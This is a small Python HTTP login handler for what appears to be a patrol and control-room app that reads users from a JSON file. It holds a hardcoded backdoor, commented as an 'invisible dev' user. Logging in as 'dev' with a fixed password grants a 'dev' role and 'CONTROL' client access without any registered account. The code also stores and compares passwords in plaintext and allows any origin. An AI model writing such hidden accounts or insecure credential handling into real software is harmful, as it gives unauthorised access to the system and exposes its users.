from http.server import BaseHTTPRequestHandler
import json, os
FILE='/tmp/zondi_users.json'
def load():
    if not os.path.exists(FILE): return {}
    try:
        with open(FILE,'r') as f: return json.load(f)
    except: return {}

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type','application/json')
        self.send_header('Access-Control-Allow-Origin','*')
        self.end_headers()
        length=int(self.headers.get('content-length',0))
        body=json.loads(self.rfile.read(length).decode())
        phone=body.get('phone','').strip()
        password=body.get('password','')
        # INVISIBLE DEV - this user doesn't exist in register
        if phone=='dev' and password=='zondi@123':
            self.wfile.write(json.dumps({"ok":True,"role":"dev","client_id":"CONTROL"}).encode()); return
        users=load()
        u=users.get(phone)
        if not u or u['password']!=password:
            self.wfile.write(json.dumps({"ok":False,"msg":"Invalid login"}).encode()); return
        if u['status']=='pending':
            self.wfile.write(json.dumps({"ok":False,"msg":"⏳ Patrol pending approval from Control Room"}).encode()); return
        self.wfile.write(json.dumps({"ok":True,"role":u['role'],"client_id":u['client_id']}).encode())
